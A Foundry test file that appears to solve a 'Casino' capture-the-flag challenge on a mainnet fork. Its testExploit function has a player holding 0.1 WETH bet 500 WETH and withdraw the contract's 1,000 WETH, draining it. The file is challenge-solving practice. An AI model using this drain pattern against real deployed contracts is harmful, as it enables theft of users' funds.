// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {IERC20} from "openzeppelin-contracts/contracts/token/ERC20/extensions/ERC20Wrapper.sol";
import {Test} from "forge-std/Test.sol";
import {MainnetConfig as Config} from "./NetworkConfig.sol";
import {CasinoBase, Casino} from "src/Casino.sol";

import "forge-std/console.sol";

contract CasinoTest is Test {
    CasinoBase public base;
    Casino public casino;
    address public you;
    address public owner;

    function setUp() external {
        vm.createSelectFork(Config.RPC_URL);
        uint256 startTime = block.timestamp + 60;
        uint256 endTime = startTime + 60;
        uint256 fullScore = 100;
        do {
            vm.rollFork(block.number - 1);
            base =
            new CasinoBase(startTime, endTime, fullScore, Config.WETH);
            you = makeAddr("you");
            deal(Config.WETH, you, 0.1e18);
            deal(Config.WETH, address(base), 1_000e18);
            base.setup();
            casino = base.casino();
        } while (casino.slot() == 0);
    }

    function testExploit() public {
        vm.startPrank(you);
        // play with WETH
        casino.play(Config.WETH, 500e18);
        casino.withdraw(Config.WETH, 1_000e18);
        // solve
        base.solve();
        assertEq(base.isSolved(), true);
        vm.stopPrank();
    }
}
